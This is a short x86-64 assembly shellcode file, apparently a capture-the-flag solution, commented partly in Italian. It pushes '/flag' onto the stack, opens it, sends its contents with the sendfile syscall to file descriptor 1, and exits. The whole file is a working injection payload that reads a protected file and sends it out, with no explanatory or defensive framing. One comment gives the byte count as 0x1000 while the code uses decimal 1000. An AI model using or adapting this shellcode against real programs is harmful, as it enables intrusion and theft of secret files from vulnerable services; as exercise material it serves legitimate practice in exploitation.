section .text
global _start

_start:
    # --- OPEN("/flag", O_RDONLY) ---
    mov rbx, 0x00000067616c662f     #carico in rbx flag con gli utlimi byte vuoti a 0
    push rbx                        # Push "flag"
    mov rdi, rsp                    # rdi = pointer to "/flag"
    xor rsi, rsi                    # rsi = 0, ovvero null, che viene letto poi come o_rdonly
    mov rax, 2                      # numero syscall open
    syscall                         # execute syscall

    # --- SENDFILE(sock_fd, fd, NULL, 0x1000) ---
    mov rsi, rax                    # rsi = fd (file descriptor)
    mov rdi, 1                      # rdi = sock_fd
    xor rdx, rdx                    # rdx = NULL (offset)
    mov r10, 1000                   # r10 = 1000 bytes (size to send)
    mov rax, 40                     # numero syscall sendfile
    syscall                         # execute syscall

    # --- EXIT(0) ---
    mov rax, 60                     # numero syscall exit
    syscall                         # execute syscall